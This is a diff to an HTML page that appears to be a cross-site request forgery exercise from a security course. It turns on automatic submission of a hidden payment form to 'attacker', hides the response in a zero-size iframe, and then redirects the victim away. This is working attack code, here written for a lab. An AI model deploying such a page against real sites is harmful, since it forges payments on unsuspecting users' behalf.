@@ -5,7 +5,7 @@
 
 <div class="payment-form" style="visibility:hidden">
   <h3 class="payment-header">Make payment?</h3>
-  <form action="//localhost:8080/pay" method="post">
+  <form action="//localhost:8080/pay" method="post" target="myiframe">
     <div class="form-group">
       <div class="form-label">To:</div>
       <div class="form-input"><input name="recipient" type="text" value="attacker"/></div>
@@ -16,13 +16,17 @@
     </div>
     <input class="form-button" type="submit" value="Pay"/>
   </form>
-  <iframe id="myiframe"></iframe>
+  
 </div>
+<iframe id="myiframe" name="myiframe" style="width: 0px; height: 0px;"></iframe>
 </html>
 
 <script>
+  function redirecct(){
+    window.top.location.href = "http://github.com/tomrist/cs5435-fall2019";
+  }
     document.addEventListener("DOMContentLoaded", function(){
-    //document.forms[0].submit();
+    document.forms[0].submit();
     });
-document.getElementById("myiframe").src = "https://github.com/tomrist/cs5435-fall2019"
+    document.getElementById('myiframe').addEventListener('load',redirecct);
 </script>
